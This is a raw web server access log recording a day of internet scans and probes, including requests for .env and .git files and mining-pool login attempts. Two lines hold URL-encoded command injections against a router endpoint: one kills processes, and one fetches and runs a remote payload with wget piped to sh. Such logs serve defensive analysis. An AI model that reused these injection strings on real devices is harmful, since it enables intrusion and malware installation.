217.148.140.139 - - [22/Sep/2024:00:07:44 +0000] "GET /58uz HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux; rv:74.0) Gecko/20100101 Firefox/74.0"
217.148.140.139 - - [22/Sep/2024:00:07:49 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux; rv:74.0) Gecko/20100101 Firefox/74.0"
185.224.128.47 - - [22/Sep/2024:00:18:30 +0000] "GET / HTTP/1.0" 200 1401 "-" "ivre-masscan/1.3 https://github.com/robertdavidgraham/"
135.125.246.110 - - [22/Sep/2024:00:26:00 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [22/Sep/2024:00:26:00 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
211.21.106.84 - - [22/Sep/2024:00:43:27 +0000] "GET /js/brand.js HTTP/1.1" 200 429 "-" "python-requests/2.32.3"
211.21.106.84 - - [22/Sep/2024:00:43:27 +0000] "GET /js/login.js HTTP/1.1" 200 1751 "-" "python-requests/2.32.3"
95.214.55.138 - - [22/Sep/2024:00:53:39 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
66.175.213.4 - - [22/Sep/2024:01:59:10 +0000] "\x16\x03\x01" 400 226 "-" "-"
45.79.115.59 - - [22/Sep/2024:02:01:34 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 zgrab/0.x"
104.248.50.219 - - [22/Sep/2024:02:07:59 +0000] "GET /.git/config HTTP/1.1" 302 - "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36"
135.125.246.110 - - [22/Sep/2024:02:25:02 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [22/Sep/2024:02:25:02 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
172.105.82.111 - - [22/Sep/2024:02:26:11 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
172.105.82.111 - - [22/Sep/2024:02:32:23 +0000] "GET /xhC9 HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.0.0 Safari/537.36"
172.105.82.111 - - [22/Sep/2024:02:36:32 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
205.210.31.29 - - [22/Sep/2024:02:49:15 +0000] "GET / HTTP/1.0" 200 1401 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
157.245.77.56 - - [22/Sep/2024:02:58:51 +0000] "\x16\x03\x03\x01\xa5\x01" 400 226 "-" "-"
157.245.77.56 - - [22/Sep/2024:02:58:51 +0000] "\x16\x03\x03\x01\xa5\x01" 400 226 "-" "-"
157.245.77.56 - - [22/Sep/2024:02:58:51 +0000] "\x16\x03\x03\x01V\x01" 400 226 "-" "-"
157.245.77.56 - - [22/Sep/2024:02:58:51 +0000] "\x16\x03\x03\x01H\x01" 400 226 "-" "-"
157.245.77.56 - - [22/Sep/2024:02:58:52 +0000] "\x16\x03\x03\x01\x99\x01" 400 226 "-" "-"
157.245.77.56 - - [22/Sep/2024:02:58:52 +0000] "\x16\x03\x02\x01\x9a\x01" 400 226 "-" "-"
157.245.77.56 - - [22/Sep/2024:02:58:52 +0000] "\x16\x03\x01\x01\xa7\x01" 400 226 "-" "-"
157.245.77.56 - - [22/Sep/2024:02:58:52 +0000] "\x16\x03\x01\x01\xa7\x01" 400 226 "-" "-"
157.245.77.56 - - [22/Sep/2024:02:58:53 +0000] "\x16\x03\x01\x01\x9d\x01" 400 226 "-" "-"
157.245.77.56 - - [22/Sep/2024:02:58:53 +0000] "\x16\x03\x01\x01\xb4\x01" 400 226 "-" "-"
157.245.77.56 - - [22/Sep/2024:02:59:24 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
157.245.77.56 - - [22/Sep/2024:02:59:43 +0000] "GET / HTTP/1.1" 200 1401 "-" "HTTP Banner Detection (https://security.ipip.net)"
157.245.77.56 - - [22/Sep/2024:03:00:19 +0000] "GET /favicon.ico HTTP/1.1" 302 - "-" "HTTP Banner Detection (https://security.ipip.net)"
157.245.77.56 - - [22/Sep/2024:03:00:28 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
157.245.77.56 - - [22/Sep/2024:03:00:56 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
141.98.103.162 - - [22/Sep/2024:03:02:40 +0000] "GET /8vv8 HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko"
128.1.160.146 - - [22/Sep/2024:03:02:45 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
91.90.42.154 - - [22/Sep/2024:03:19:33 +0000] "\x16\x03" 400 226 "-" "-"
91.90.42.154 - - [22/Sep/2024:03:19:34 +0000] "GET /h4Zf HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; UHS)"
91.90.42.154 - - [22/Sep/2024:03:19:34 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; UHS)"
91.90.42.154 - - [22/Sep/2024:03:19:34 +0000] "GET /OEha HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; UHS)"
162.216.149.63 - - [22/Sep/2024:03:38:22 +0000] "GET / HTTP/1.1" 200 1401 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
93.174.93.12 - - [22/Sep/2024:03:51:41 +0000] "\x16\x03\x02\x01o\x01" 400 226 "-" "-"
206.168.34.42 - - [22/Sep/2024:04:14:35 +0000] "GET / HTTP/1.1" 200 1401 "-" "-"
206.168.34.42 - - [22/Sep/2024:04:14:38 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.42 - - [22/Sep/2024:04:14:39 +0000] "GET /favicon.ico HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.42 - - [22/Sep/2024:04:14:39 +0000] "GET / HTTP/1.1" 200 1401 "http://54.224.97.58/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.42 - - [22/Sep/2024:04:14:39 +0000] "PRI * HTTP/2.0" 400 226 "-" "-"
64.227.41.39 - - [22/Sep/2024:04:17:33 +0000] "GET /aaa9 HTTP/1.1" 302 - "-" "Mozilla/5.0 zgrab/0.x"
64.227.41.39 - - [22/Sep/2024:04:17:33 +0000] "\x16\x03\x01" 400 226 "-" "-"
64.227.41.39 - - [22/Sep/2024:04:17:34 +0000] "GET /aab8 HTTP/1.1" 302 - "-" "Mozilla/5.0 zgrab/0.x"
64.227.41.39 - - [22/Sep/2024:04:17:34 +0000] "\x16\x03\x01" 400 226 "-" "-"
64.227.41.39 - - [22/Sep/2024:04:17:34 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 zgrab/0.x"
135.125.246.110 - - [22/Sep/2024:04:37:40 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [22/Sep/2024:04:37:41 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.79.181.94 - - [22/Sep/2024:04:48:23 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
106.75.65.24 - - [22/Sep/2024:04:56:01 +0000] "GET / HTTP/1.1" 200 1401 "-" "-"
106.75.175.130 - - [22/Sep/2024:05:01:50 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
106.75.175.130 - - [22/Sep/2024:05:01:51 +0000] "GET /favicon.ico HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
106.75.175.130 - - [22/Sep/2024:05:01:51 +0000] "GET / HTTP/1.1" 200 1401 "http://54.224.97.58/favicon.ico" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
106.75.175.130 - - [22/Sep/2024:05:01:52 +0000] "GET /favicon.ico HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
106.75.175.130 - - [22/Sep/2024:05:01:52 +0000] "GET / HTTP/1.1" 200 1401 "http://54.224.97.58/favicon.ico" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
106.75.175.130 - - [22/Sep/2024:05:01:53 +0000] "GET /js/brand.js HTTP/1.1" 200 429 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
106.75.175.130 - - [22/Sep/2024:05:01:53 +0000] "GET /js/login.js HTTP/1.1" 200 1751 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
96.126.104.20 - - [22/Sep/2024:05:09:28 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
96.126.104.20 - - [22/Sep/2024:05:17:10 +0000] "GET /w1hL HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.0.0 Safari/537.36"
96.126.104.20 - - [22/Sep/2024:05:23:24 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
172.105.82.111 - - [22/Sep/2024:05:47:02 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
172.105.82.111 - - [22/Sep/2024:05:53:10 +0000] "GET /uCJZ HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.0.0 Safari/537.36"
172.105.82.111 - - [22/Sep/2024:05:57:29 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
136.144.17.30 - - [22/Sep/2024:06:04:06 +0000] "GET /ab2g HTTP/1.1" 302 - "-" ""
136.144.17.30 - - [22/Sep/2024:06:04:06 +0000] "GET / HTTP/1.1" 200 1401 "-" ""
136.144.17.30 - - [22/Sep/2024:06:04:07 +0000] "GET /ab2h HTTP/1.1" 302 - "-" ""
136.144.17.30 - - [22/Sep/2024:06:04:07 +0000] "GET / HTTP/1.1" 200 1401 "-" ""
185.242.226.10 - - [22/Sep/2024:06:12:52 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
185.16.39.118 - - [22/Sep/2024:06:25:53 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
35.195.170.254 - - [22/Sep/2024:06:26:57 +0000] "GET / HTTP/1.1" 200 1401 "-" "python-requests/2.32.2"
195.91.137.236 - - [22/Sep/2024:06:43:21 +0000] "GET / HTTP/1.1" 200 1401 "-" "-"
161.35.208.212 - - [22/Sep/2024:06:58:31 +0000] "\x16\x03\x01\x01$\x01" 400 226 "-" "-"
135.125.246.110 - - [22/Sep/2024:06:59:28 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [22/Sep/2024:06:59:28 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
91.90.42.154 - - [22/Sep/2024:07:08:05 +0000] "\x16\x03" 400 226 "-" "-"
91.90.42.154 - - [22/Sep/2024:07:08:05 +0000] "GET /8iYb HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;NLNL)"
91.90.42.154 - - [22/Sep/2024:07:08:06 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;NLNL)"
91.90.42.154 - - [22/Sep/2024:07:08:06 +0000] "GET /qEn9 HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;NLNL)"
135.125.246.110 - - [22/Sep/2024:07:22:25 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [22/Sep/2024:07:22:25 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
4.255.100.158 - - [22/Sep/2024:07:25:07 +0000] "GET /portal/redlion HTTP/1.1" 302 - "-" "Mozilla/5.0 zgrab/0.x"
147.185.132.49 - - [22/Sep/2024:07:25:29 +0000] "GET / HTTP/1.0" 200 1401 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
139.59.187.176 - - [22/Sep/2024:07:26:16 +0000] "\x16\x03\x01\x01\xfb\x01" 400 226 "-" "-"
45.9.249.58 - - [22/Sep/2024:08:02:34 +0000] "GET /Du2q HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)"
176.126.103.21 - - [22/Sep/2024:08:22:30 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0"
185.91.69.110 - - [22/Sep/2024:08:33:29 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
185.91.69.110 - - [22/Sep/2024:08:33:30 +0000] "{\"id\": 1, \"method\": \"mining.subscribe\", \"params\": [\"cpuminer/2.5.1\"]}\n" 400 226 "-" "-"
185.91.69.110 - - [22/Sep/2024:08:33:30 +0000] "{\"id\": 1, \"method\": \"mining.subscribe\", \"params\": [\"MinerName/1.0.0\", \"EthereumStratum/1.0.0\"]}\n" 400 226 "-" "-"
185.91.69.110 - - [22/Sep/2024:08:33:31 +0000] "{\"id\":1,\"method\":\"eth_submitLogin\",\"worker\":\"igwrcvap\",\"params\":[\"0x828dfe71c28d4096ae5daf56be3a835eae525437\",\"x\"],\"jsonrpc\":\"2.0\"}\n" 400 226 "-" "-"
185.91.69.110 - - [22/Sep/2024:08:33:31 +0000] "{\"id\":1,\"jsonrpc\":\"2.0\",\"method\":\"login\",\"params\":{\"login\":\"46AVDTX8vd5Q5K9aXReYbDfc3h21CrMsjQHuMmQELpVbBWomhS8cwUDhSGwWeVWorCfBVuh1bVKSd9s78LVKYzWwFnWPeDY\",\"pass\":\"x\",\"agent\":\"XMRig/6.15.3 (Windows NT 10.0; Win64; x64) libuv/1.42.0 msvc/2019\",\"algo\":[\"cn/1\",\"cn/2\",\"cn/r\",\"cn/fast\",\"cn/half\",\"cn/xao\",\"cn/rto\",\"cn/rwz\",\"cn/zls\",\"cn/double\",\"cn/ccx\",\"cn-lite/1\",\"cn-heavy/0\",\"cn-heavy/tube\",\"cn-heavy/xhv\",\"cn-pico\",\"cn-pico/tlo\",\"cn/upx2\",\"rx/0\",\"rx/wow\",\"rx/arq\",\"rx/graft\",\"rx/sfx\",\"rx/keva\",\"argon2/chukwa\",\"argon2/chukwav2\",\"argon2/ninja\",\"astrobwt\"]}}\n" 400 226 "-" "-"
185.91.69.110 - - [22/Sep/2024:08:33:32 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
185.91.69.110 - - [22/Sep/2024:08:33:32 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
185.91.69.110 - - [22/Sep/2024:08:33:32 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
185.91.69.110 - - [22/Sep/2024:08:33:33 +0000] "GET /WuEL HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; ; NCLIENT50_AAPCDA5841E333)"
185.91.69.110 - - [22/Sep/2024:08:33:33 +0000] "GET stager64 HTTP/1.1" 400 226 "-" "-"
185.91.69.110 - - [22/Sep/2024:08:33:34 +0000] "GET /a HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
185.91.69.110 - - [22/Sep/2024:08:33:34 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
185.91.69.110 - - [22/Sep/2024:08:33:35 +0000] "GET /download/file.ext HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
185.91.69.110 - - [22/Sep/2024:08:33:35 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
185.91.69.110 - - [22/Sep/2024:08:33:35 +0000] "GET /SiteLoader HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
185.91.69.110 - - [22/Sep/2024:08:33:36 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
185.91.69.110 - - [22/Sep/2024:08:33:36 +0000] "GET /mPlayer HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
185.91.69.110 - - [22/Sep/2024:08:33:37 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
185.91.69.110 - - [22/Sep/2024:08:33:37 +0000] "POST / HTTP/1.1" 400 226 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
172.105.82.111 - - [22/Sep/2024:08:38:51 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
172.105.82.111 - - [22/Sep/2024:08:45:56 +0000] "GET /WnKL HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.0.0 Safari/537.36"
172.105.82.111 - - [22/Sep/2024:08:50:00 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
149.50.103.48 - - [22/Sep/2024:09:01:33 +0000] "GET / HTTP/1.1" 200 1401 "-" "-"
135.125.246.110 - - [22/Sep/2024:09:07:13 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [22/Sep/2024:09:07:13 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
176.123.10.101 - - [22/Sep/2024:09:26:52 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0"
93.174.93.12 - - [22/Sep/2024:09:50:19 +0000] "\x16\x03\x02\x01o\x01" 400 226 "-" "-"
185.224.128.83 - - [22/Sep/2024:11:06:22 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60for+pid+in+%2Fproc%2F%5B0-9%5D%2A%2F%3B+do+pid%3D%24%7Bpid%25%2F%7D%3B+pid%3D%24%7Bpid%23%23%2A%2F%7D%3B+exe_path%3D%24%28ls+-l+%2Fproc%2F%24pid%2Fexe+2%3E%2Fdev%2Fnull+%7C+awk+%27%7Bprint+%24NF%7D%27%29%3B+if+%5B%5B+%24exe_path+%3D%3D+%2A%2F+%5D%5D%3B+then+kill+-9+%24pid%3B+fi%3B+done%3B%60 HTTP/1.1" 404 196 "-" "Go-http-client/1.1"
185.224.128.83 - - [22/Sep/2024:11:06:22 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60wget+http%3A%2F%2F185.157.247.125%2Fe%2Ft+-O-+%7Csh%3B%60 HTTP/1.1" 404 196 "-" "Go-http-client/1.1"
96.126.104.20 - - [22/Sep/2024:11:07:49 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
96.126.104.20 - - [22/Sep/2024:11:15:58 +0000] "GET /FYPm HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.0.0 Safari/537.36"
18.246.14.72 - - [22/Sep/2024:11:27:35 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"
18.246.14.72 - - [22/Sep/2024:11:28:26 +0000] "GET //unpkg.com/axios/dist/axios.min.js HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1"
18.246.14.72 - - [22/Sep/2024:11:28:26 +0000] "GET /js/login.js HTTP/1.1" 200 1751 "-" "Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0"
18.246.14.72 - - [22/Sep/2024:11:28:26 +0000] "GET /js/brand.js HTTP/1.1" 200 429 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"
18.246.14.72 - - [22/Sep/2024:11:28:26 +0000] "GET /css/login.cs HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3890.0 Safari/537.36"
135.125.246.110 - - [22/Sep/2024:11:47:31 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [22/Sep/2024:11:47:31 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
43.130.16.212 - - [22/Sep/2024:11:50:19 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
34.140.54.29 - - [22/Sep/2024:11:50:36 +0000] "GET / HTTP/1.1" 200 1401 "-" "python-requests/2.32.2"
91.90.42.154 - - [22/Sep/2024:12:02:52 +0000] "\x16\x03" 400 226 "-" "-"
91.90.42.154 - - [22/Sep/2024:12:02:52 +0000] "GET /m8Fq HTTP/1.1" 302 - "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; InfoPath.2; .NET CLR 2.0.50727)"
91.90.42.154 - - [22/Sep/2024:12:02:52 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; InfoPath.2; .NET CLR 2.0.50727)"
91.90.42.154 - - [22/Sep/2024:12:02:52 +0000] "GET /0Tkn HTTP/1.1" 302 - "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; InfoPath.2; .NET CLR 2.0.50727)"
136.144.17.30 - - [22/Sep/2024:12:05:19 +0000] "GET /ab2g HTTP/1.1" 302 - "-" ""
136.144.17.30 - - [22/Sep/2024:12:05:33 +0000] "GET /ab2h HTTP/1.1" 302 - "-" ""
172.104.11.34 - - [22/Sep/2024:12:37:32 +0000] "\x16\x03\x01" 400 226 "-" "-"
172.105.82.111 - - [22/Sep/2024:12:50:51 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
172.105.82.111 - - [22/Sep/2024:12:57:40 +0000] "GET /8vZT HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.0.0 Safari/537.36"
35.184.118.54 - - [22/Sep/2024:12:59:39 +0000] "GET / HTTP/1.0" 200 1401 "-" "-"
185.16.39.118 - - [22/Sep/2024:13:01:25 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
35.184.118.54 - - [22/Sep/2024:13:02:12 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
35.184.118.54 - - [22/Sep/2024:13:02:12 +0000] "GET / HTTP/1.0" 200 1401 "-" "-"
35.184.118.54 - - [22/Sep/2024:13:02:12 +0000] "POST /sdk HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
35.184.118.54 - - [22/Sep/2024:13:02:12 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
35.184.118.54 - - [22/Sep/2024:13:02:13 +0000] "GET /evox/about HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
35.184.118.54 - - [22/Sep/2024:13:02:13 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
35.184.118.54 - - [22/Sep/2024:13:02:13 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
130.185.85.106 - - [22/Sep/2024:13:02:34 +0000] "GET /tDNV HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko"
35.184.118.54 - - [22/Sep/2024:13:02:34 +0000] "GET / HTTP/1.0" 200 1401 "-" "-"
35.184.118.54 - - [22/Sep/2024:13:02:34 +0000] "GET / HTTP/1.1" 200 1401 "-" "-"
89.187.160.146 - - [22/Sep/2024:13:02:36 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
172.105.82.111 - - [22/Sep/2024:13:02:40 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
172.105.128.12 - - [22/Sep/2024:13:29:22 +0000] "\x16\x03\x01" 400 226 "-" "-"
